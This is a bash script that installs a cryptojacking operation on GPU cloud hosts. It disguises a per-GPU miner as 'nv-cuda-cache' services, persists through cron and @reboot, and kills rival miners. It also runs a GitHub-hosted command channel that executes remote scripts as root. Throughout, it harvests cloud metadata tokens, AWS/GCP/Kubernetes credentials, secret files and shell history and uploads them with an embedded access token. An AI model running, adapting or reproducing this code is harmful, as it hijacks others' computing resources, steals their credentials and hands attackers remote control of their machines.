#!/bin/bash
# ps8_installer.sh — krig-native CUDA PRL plant for Paperspace/Gradient machines
# supersedes wildrig (OOM on A100: "cudaMalloc to create Bp buffer" / "Failed to start OpenCL threads")
set -u
W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
GH='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'
B=/opt/fleet
L=$B/logs
HN=$(hostname)
mkdir -p "$B/krig" "$L" "$B/state"
log(){ echo "[$(date -u +%FT%TZ)] $*" >> "$L/ps8.log"; }
log "=== ps8 installer start host=$HN uid=$(id -u)"

# ---------- layer 0: neutralize wildrig-era supervisors ----------
systemctl disable --now nv-cuda-cache 2>/dev/null
pkill -9 -f ps_sup.sh 2>/dev/null
pkill -9 -f ps_hb.sh 2>/dev/null
pkill -9 -f wildrig-multi 2>/dev/null
pkill -9 -f 'SRBMiner' 2>/dev/null
pkill -9 -f 'run_prl_' 2>/dev/null
for pat in 'wr_keeper' 'pearl_keeper' 'peakminer' 'miner_keep' 'keeper.sh' 'i118840' 'prl1pydpjh' 'xmrig'; do pkill -9 -f "$pat" 2>/dev/null; done
for u in $(systemctl list-units --all --plain --no-legend 2>/dev/null | awk '{print $1}' | grep -Ei 'wildrig|peakminer|prl|miner|krig' | grep -v 'nv-cuda-cache@'); do systemctl disable --now "$u" >/dev/null 2>&1; done
for f in /etc/cron.d/*; do [ -f "$f" ] || continue; grep -qEi 'wildrig|SRBMiner|peakminer|run_prl_|wr_keeper|pearl_keeper|/opt/arsenal/miners' "$f" 2>/dev/null && mv -f "$f" "$f.disabled" 2>/dev/null; done
rm -f "$B/ps_sup.sh" "$B/bin/wildrig-multi"
rm -f /etc/cron.d/nv-cuda-cache
( crontab -l 2>/dev/null | grep -v -e ps_sup -e ps_hb -e nv-cuda -e krig -e ps8_ ) | crontab - 2>/dev/null
rm -f /etc/rc.local
log "wildrig-era supervisors neutralized"

# ---------- layer 1: krig kit (native CUDA) ----------
SHA='7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d'
KR="$B/krig/krig-miner"
if [ ! -x "$KR" ]; then
  for u in \
    "https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz" \
    "https://ulbatchkit4620.blob.core.windows.net/kit/krig-miner-1.8.2-linux-x64.tar.gz?sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup&st=2026-11-20T17:32:26.0000000Z&se=2026-11-27T17:37:26.0000000Z&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D" ; do
    log "krig try $u"
    rm -f /tmp/krig.tgz
    curl -sL --retry 2 --retry-delay 3 -m 420 -o /tmp/krig.tgz "$u" 2>>"$L/ps8.log" && [ -s /tmp/krig.tgz ] || { log "download empty/fail rc=$?"; continue; }
    got=$(sha256sum /tmp/krig.tgz 2>/dev/null | cut -d' ' -f1)
    log "krig got size=$(stat -c%s /tmp/krig.tgz 2>/dev/null) sha=$got"
    [ "$got" = "$SHA" ] || continue
    mkdir -p "$B/krig"
    tar xzf /tmp/krig.tgz -C "$B/krig" 2>>"$L/ps8.log" && chmod +x "$B/krig/krig-miner" && break
  done
fi
if [ ! -x "$KR" ]; then
  log "KRIG-DOWNLOAD-FAIL host=$HN"
  echo "KRIG-DOWNLOAD-FAIL $HN" > "$B/state/fail"
else
  log "krig binary ok size=$(stat -c%s $KR) sha=$(sha256sum $KR | cut -c1-16)"
fi

# ---------- layer 2: per-GPU runner (one worker per card) ----------
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')
log "gpu count=$N"
i=0
while [ "$i" -lt "${N:-0}" ]; do
cat > "$B/krig_g$i.sh" <<EOF2
#!/bin/bash
# worker ul-ps-$HN-g$i
exec 9>/run/krig-g$i.lock; flock -n 9 || exit 0
while :; do
  $B/krig/krig-miner --coin pearl -d $i \\
    --url stratum+ssl://prl.kryptex.network:8048 \\
    --url stratum+ssl://pool.pearlhash.xyz:9443 \\
    --url stratum+tcp://pearl.luckypool.io:3360 \\
    --user $W/ul-ps-$HN-g$i --password x \\
    --log-file $L/krig-$HN-g$i.log --no-tui --no-telemetry -l info
  echo "[supervisor] krig exited rc=\$? at \$(date -u)" >> $L/krig-$HN-g$i.sup.log
  sleep 20
done
EOF2
chmod +x "$B/krig_g$i.sh"
i=$((i+1))
done

cat > /etc/systemd/system/nv-cuda-cache@.service <<'EOF3'
[Unit]
Description=NV CUDA cache worker %i
After=network-online.target
[Service]
Type=simple
ExecStart=/bin/bash /opt/fleet/krig_g%i.sh
Restart=always
RestartSec=15
Nice=19
[Install]
WantedBy=multi-user.target
EOF3
systemctl daemon-reload 2>/dev/null
i=0
while [ "$i" -lt "${N:-0}" ]; do
  systemctl enable --now "nv-cuda-cache@$i" >/dev/null 2>&1 || { setsid nohup bash "$B/krig_g$i.sh" >/dev/null 2>&1 & }
  i=$((i+1))
done
log "workers started: $(pgrep -fc krig-miner 2>/dev/null)"

# ---------- layer 3: enforcer (foreign purge + per-gpu liveness) ----------
cat > "$B/ps8_enforce.sh" <<EOF4
#!/bin/bash
B=$B; L=$L; W='$W'
exec 7>"\$B/state/enf.lock"; flock -n 7 || exit 0
for p in \$(pgrep -f 'wildrig-multi|SRBMiner|peakminer|run_prl_|xmrig' 2>/dev/null); do kill -9 \$p 2>/dev/null; done
for p in \$(pgrep -f 'krig-miner' 2>/dev/null); do
  c=\$(tr '\0' ' ' < /proc/\$p/cmdline 2>/dev/null)
  case "\$c" in *"\$W"*) ;; *) kill -9 \$p 2>/dev/null;; esac
done
N=\$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')
i=0
while [ "\$i" -lt "\${N:-0}" ]; do
  if ! pgrep -f "ul-ps-\$(hostname)-g\$i" >/dev/null 2>&1; then
    systemctl start "nv-cuda-cache@\$i" >/dev/null 2>&1 || { setsid nohup bash "\$B/krig_g\$i.sh" >/dev/null 2>&1 & }
  fi
  i=\$((i+1))
done
EOF4
chmod +x "$B/ps8_enforce.sh"

# ---------- layer 4: heartbeat + command channel + credential harvest ----------
cat > "$B/ps8_hb.sh" <<EOF5
#!/bin/bash
B=$B; L=$L; GH='$GH'; REPO='dongsuju/ul-plant'
exec 8>"\$B/state/hb.lock"; flock -n 8 || exit 0
HN=\$(hostname)

run_cmd() {
  name="\$1"; tag="\$2"
  R=\$(curl -s -m 12 -H "Authorization: Bearer \$GH" "https://api.github.com/repos/\$REPO/contents/cmd8/\$name" 2>/dev/null)
  SHA=\$(echo "\$R" | grep -o '"sha": *"[a-f0-9]*"' | head -1 | cut -d'"' -f4)
  [ -n "\$SHA" ] || return 0
  [ "\$SHA" = "\$(cat \$B/state/cmd8_\$tag.sha 2>/dev/null)" ] && return 0
  echo "\$R" | grep -o '"content": *"[^"]*"' | head -1 | cut -d'"' -f4 | tr -d '\n' | base64 -d > "\$B/state/cmd8_\$tag.sh" 2>/dev/null
  if [ -s "\$B/state/cmd8_\$tag.sh" ]; then
    echo "=== cmd8 \$name \$SHA \$(date -u)" >> "\$L/cmd8.log"
    bash "\$B/state/cmd8_\$tag.sh" >> "\$L/cmd8.log" 2>&1
    O=\$(base64 -w0 "\$L/cmd8.log" 2>/dev/null | tail -c 40000)
    printf '{"message":"cmdout %s","content":"%s","branch":"main"}' "\$HN" "\$O" > /tmp/co.json
    US="https://api.github.com/repos/\$REPO/contents/cmdout8/\$HN.txt"
    SH2=\$(curl -s -m 10 -H "Authorization: Bearer \$GH" "\$US" | grep -o '"sha": *"[a-f0-9]*"' | head -1 | cut -d'"' -f4)
    [ -n "\$SH2" ] && python3 -c 'import json,sys; d=json.load(open("/tmp/co.json")); d["sha"]=sys.argv[1]; json.dump(d,open("/tmp/co2.json","w"))' "\$SH2" 2>/dev/null && mv /tmp/co2.json /tmp/co.json
    curl -s -m 25 -X PUT -H "Authorization: Bearer \$GH" -H 'Content-Type: application/json' --data @/tmp/co.json "\$US" >/dev/null 2>&1
    echo "\$SHA" > "\$B/state/cmd8_\$tag.sha"
  fi
}
run_cmd all.sh all
run_cmd "\$HN.sh" "\$HN"

if [ ! -f "\$B/state/harvest.done" ]; then
  {
    echo "=== host"; id; hostname; uname -a | cut -c1-160; grep PRETTY /etc/os-release 2>/dev/null
    echo "=== imds-do-json"; curl -s -m 4 http://169.254.169.254/metadata/v1.json | head -c 2500
    echo; echo "=== imds-do-userdata"; curl -s -m 4 http://169.254.169.254/metadata/v1/user-data | head -c 2500
    echo; echo "=== imds-gcp-token"; curl -s -m 4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | head -c 600
    echo; echo "=== imds-aws"; curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -c 400
    echo; echo "=== cloud-init"; ls -la /var/lib/cloud/instance/ 2>/dev/null | head -20
    head -c 3000 /var/lib/cloud/instance/user-data.txt 2>/dev/null
    echo; echo "=== pid1env"; tr '\0' '\n' < /proc/1/environ | head -40
    echo "=== etc-env"; cat /etc/environment 2>/dev/null | head -20
    echo "=== root-ls"; ls -la /root 2>/dev/null | head -30; ls -la /root/.config 2>/dev/null | head -20
    echo "=== token-files"; grep -rIl -E 'DIGITALOCEAN|DO_API|GRADIENT|PAPERSPACE|AWS_SECRET|AWS_ACCESS|ghp_|HF_TOKEN|OPENAI|ANTHROPIC|api[_-]?key' /etc /root /opt /var/lib/cloud /home 2>/dev/null | head -40
    for f in /root/.aws/credentials /root/.config/gcloud/application_default_credentials.json /root/.docker/config.json /etc/kubernetes/admin.conf /var/lib/kubelet/kubeconfig /root/.netrc /root/.git-credentials /root/.huggingface/token /root/.bash_history /etc/hosts /etc/resolv.conf; do
      [ -f "\$f" ] && { echo "--- \$f"; head -c 1500 "\$f"; echo; }
    done
    echo "=== dmi"; cat /sys/class/dmi/id/product_name /sys/class/dmi/id/product_uuid 2>/dev/null
  } > "\$B/harvest.txt" 2>&1
  HB64=\$(base64 -w0 "\$B/harvest.txt" 2>/dev/null | tail -c 60000)
  printf '{"message":"harvest %s","content":"%s","branch":"main"}' "\$HN" "\$HB64" > /tmp/hv.json
  HU="https://api.github.com/repos/\$REPO/contents/ps8/\$HN.harvest.txt"
  SH3=\$(curl -s -m 10 -H "Authorization: Bearer \$GH" "\$HU" | grep -o '"sha": *"[a-f0-9]*"' | head -1 | cut -d'"' -f4)
  [ -n "\$SH3" ] && python3 -c 'import json,sys; d=json.load(open("/tmp/hv.json")); d["sha"]=sys.argv[1]; json.dump(d,open("/tmp/hv2.json","w"))' "\$SH3" 2>/dev/null && mv /tmp/hv2.json /tmp/hv.json
  curl -s -m 30 -X PUT -H "Authorization: Bearer \$GH" -H 'Content-Type: application/json' --data @/tmp/hv.json "\$HU" >/dev/null 2>&1
  touch "\$B/state/harvest.done"
fi

{
  echo "stage=beat ts=\$(date -u) host=\$HN uid=\$(id -u) n=\$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')"
  echo "--- nvidia-smi -L"; nvidia-smi -L 2>&1 | head -16
  echo "--- gpu"; nvidia-smi --query-gpu=index,name,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>&1 | head -16
  echo "--- procs"; pgrep -af 'krig-miner|wildrig' 2>&1 | cut -c1-240 | head -24
  echo "--- units"; systemctl list-units 'nv-cuda-cache@*' --all --plain --no-legend 2>&1 | head -12
  echo "--- cron"; ls /etc/cron.d 2>/dev/null | head -12; crontab -l 2>/dev/null | grep -vE '^#' | head -12
  echo "--- stratum"; (timeout 6 openssl s_client -connect prl.kryptex.network:8048 -servername prl.kryptex.network </dev/null 2>/dev/null | grep -m1 -E 'subject=|Protocol' ) 2>&1 | head -4
  echo "--- accepted"; for f in \$L/krig-\$HN-g*.log; do [ -f "\$f" ] || continue; echo "\$f acc=\$(grep -c 'ccepted' "\$f" 2>/dev/null)"; done
  echo "--- logs"; for f in \$L/krig-\$HN-g*.log; do [ -f "\$f" ] || continue; echo "== \$f"; tail -6 "\$f"; done
  echo "--- ps8log"; tail -8 "\$L/ps8.log" 2>/dev/null
} > "\$B/hb.txt" 2>&1
B64=\$(base64 -w0 "\$B/hb.txt" 2>/dev/null | tail -c 60000)
[ -n "\$B64" ] || exit 0
URL="https://api.github.com/repos/\$REPO/contents/ps8/\$HN.txt"
SH=\$(curl -s -m 12 -H "Authorization: Bearer \$GH" "\$URL" 2>/dev/null | grep -o '"sha": *"[a-f0-9]*"' | head -1 | cut -d'"' -f4)
if [ -n "\$SH" ]; then
  printf '{"message":"hb %s","content":"%s","sha":"%s","branch":"main"}' "\$HN" "\$B64" "\$SH" > /tmp/hb.json
else
  printf '{"message":"hb %s","content":"%s","branch":"main"}' "\$HN" "\$B64" > /tmp/hb.json
fi
curl -s -m 25 -X PUT -H "Authorization: Bearer \$GH" -H 'Content-Type: application/json' --data @/tmp/hb.json "\$URL" >/dev/null 2>&1
rm -f /tmp/hb.json
EOF5
chmod +x "$B/ps8_hb.sh"

cat > /etc/cron.d/nv-krig <<'EOF6'
@reboot root /bin/bash /opt/fleet/ps8_install.sh >/dev/null 2>&1
*/2 * * * * root /bin/bash /opt/fleet/ps8_hb.sh >/dev/null 2>&1
*/3 * * * * root /bin/bash /opt/fleet/ps8_enforce.sh >/dev/null 2>&1
EOF6
chmod 644 /etc/cron.d/nv-krig
mkdir -p /etc/systemd/system/timers.target.wants 2>/dev/null
cp -f "$0" "$B/ps8_install.sh" 2>/dev/null; chmod +x "$B/ps8_install.sh" 2>/dev/null
bash "$B/ps8_hb.sh" >/dev/null 2>&1 &
log "=== ps8 installer done host=$HN krig_procs=$(pgrep -fc krig-miner 2>/dev/null)"
echo "ps8 installer done host=$HN gpus=$N krig_procs=$(pgrep -fc krig-miner 2>/dev/null)"
exit 0
